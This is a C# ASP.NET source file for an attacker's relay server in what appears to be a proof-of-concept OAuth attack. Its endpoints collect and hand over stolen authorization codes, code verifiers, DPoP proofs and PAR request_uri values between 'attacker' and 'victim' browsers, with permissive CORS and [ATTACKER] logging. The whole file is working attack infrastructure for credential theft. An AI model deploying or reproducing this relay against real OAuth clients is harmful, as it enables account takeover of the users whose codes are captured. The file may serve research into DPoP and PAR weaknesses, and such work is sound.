using System.Collections.Concurrent;

var builder = WebApplication.CreateBuilder(args);

builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

// Enable CORS for the attack to work from different origins
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin()
              .AllowAnyMethod()
              .AllowAnyHeader();
    });
});

// In-memory storage for stolen credentials
builder.Services.AddSingleton<AttackStorage>();

var app = builder.Build();

app.UseCors();
app.UseSwagger();
app.UseSwaggerUI();

// Serve static files (attack.js and index.html)
app.UseDefaultFiles();
app.UseStaticFiles();

var storage = app.Services.GetRequiredService<AttackStorage>();

// Endpoint to store stolen DPoP proof from attacker's browser
app.MapPost("/api/attack/dpop", (DPoPProofData data) =>
{
    storage.StoreDPoPProof(data);
    return Results.Ok(new { success = true, sessionId = data.SessionId });
});

// Endpoint for victim's browser to poll for DPoP proof
app.MapGet("/api/attack/dpop/{sessionId}", (string sessionId) =>
{
    var proof = storage.GetDPoPProof(sessionId);
    if (proof != null)
    {
        return Results.Ok(proof);
    }
    return Results.NotFound();
});

// Generic endpoint for victim to get the latest DPoP JKT (no session ID needed)
app.MapGet("/api/attack/dpop/latest", () =>
{
    var latestProof = storage.GetLatestDPoPProof();
    if (latestProof != null)
    {
        return Results.Ok(latestProof);
    }
    return Results.NotFound();
});

// Endpoint to store stolen authorization code from victim's browser
app.MapPost("/api/attack/code", (AuthCodeData data) =>
{
    storage.StoreAuthCode(data);
    return Results.Ok(new { success = true });
});

// Endpoint for attacker's browser to poll for auth code
app.MapGet("/api/attack/code/{sessionId}", (string sessionId) =>
{
    var code = storage.GetAuthCode(sessionId);
    if (code != null)
    {
        return Results.Ok(code);
    }
    return Results.NotFound();
});

// Status endpoint to check attack progress
app.MapGet("/api/attack/status/{sessionId}", (string sessionId) =>
{
    var status = storage.GetAttackStatus(sessionId);
    return Results.Ok(status);
});

// PAR endpoints for request_uri attack
app.MapPost("/api/attack/par", (PARData data) =>
{
    storage.StorePARData(data);
    return Results.Ok(new { success = true, sessionId = data.SessionId });
});

app.MapGet("/api/attack/par/{sessionId}", (string sessionId) =>
{
    var parData = storage.GetPARData(sessionId);
    if (parData != null)
    {
        return Results.Ok(parData);
    }
    return Results.NotFound();
});

app.MapGet("/api/attack/par/latest", () =>
{
    var latestPAR = storage.GetLatestPARData();
    if (latestPAR != null)
    {
        return Results.Ok(latestPAR);
    }
    return Results.NotFound();
});

app.Run("https://localhost:7666");

// Data models
public record DPoPProofData(string SessionId, string DPoPProof, string DPoPHeader, string Nonce, string Url, string Method, string? CodeChallenge = null);
public record AuthCodeData(string SessionId, string Code, string State, string? CodeVerifier, string IssuerUrl);
public record PARData(string SessionId, string RequestUri);

// Simple in-memory storage for the attack
public class AttackStorage
{
    private readonly ConcurrentDictionary<string, DPoPProofData> _dpopProofs = new();
    private readonly ConcurrentDictionary<string, AuthCodeData> _authCodes = new();
    private readonly ConcurrentDictionary<string, PARData> _parData = new();
    private readonly ConcurrentDictionary<string, AttackStatus> _attackStatus = new();

    public void StoreDPoPProof(DPoPProofData data)
    {
        _dpopProofs[data.SessionId] = data;
        UpdateStatus(data.SessionId, "dpop_stored", "DPoP proof stored");
        Console.WriteLine($"[ATTACKER] Stored DPoP proof for session: {data.SessionId}");
    }

    public DPoPProofData? GetDPoPProof(string sessionId)
    {
        _dpopProofs.TryGetValue(sessionId, out var proof);
        if (proof != null)
        {
            UpdateStatus(sessionId, "dpop_retrieved", "DPoP proof retrieved by victim");
        }
        return proof;
    }

    public DPoPProofData? GetLatestDPoPProof()
    {
        // Return the most recently added DPoP proof
        return _dpopProofs.Values.OrderByDescending(p => p.SessionId).FirstOrDefault();
    }

    public void StoreAuthCode(AuthCodeData data)
    {
        _authCodes[data.SessionId] = data;
        UpdateStatus(data.SessionId, "code_stored", "Authorization code stored");
        Console.WriteLine($"[ATTACKER] Stored auth code for session: {data.SessionId}");
    }

    public AuthCodeData? GetAuthCode(string sessionId)
    {
        _authCodes.TryGetValue(sessionId, out var code);
        if (code != null)
        {
            UpdateStatus(sessionId, "code_retrieved", "Authorization code retrieved by attacker");
        }
        return code;
    }

    public AttackStatus GetAttackStatus(string sessionId)
    {
        if (_attackStatus.TryGetValue(sessionId, out var status))
        {
            return status;
        }
        
        // Initialize status if it doesn't exist
        status = new AttackStatus(sessionId, "pending", "Waiting for attack to start");
        _attackStatus[sessionId] = status;
        return status;
    }

    private void UpdateStatus(string sessionId, string status, string message)
    {
        _attackStatus[sessionId] = new AttackStatus(sessionId, status, message);
    }

    public void StorePARData(PARData data)
    {
        _parData[data.SessionId] = data;
        UpdateStatus(data.SessionId, "par_stored", "PAR request_uri stored");
        Console.WriteLine($"[ATTACKER] Stored PAR request_uri for session: {data.SessionId}");
    }

    public PARData? GetPARData(string sessionId)
    {
        _parData.TryGetValue(sessionId, out var data);
        if (data != null)
        {
            UpdateStatus(sessionId, "par_retrieved", "PAR request_uri retrieved by victim");
        }
        return data;
    }

    public PARData? GetLatestPARData()
    {
        // Return the most recently added PAR data
        return _parData.Values.OrderByDescending(p => p.SessionId).FirstOrDefault();
    }
}

public record AttackStatus(string SessionId, string Status, string Message);
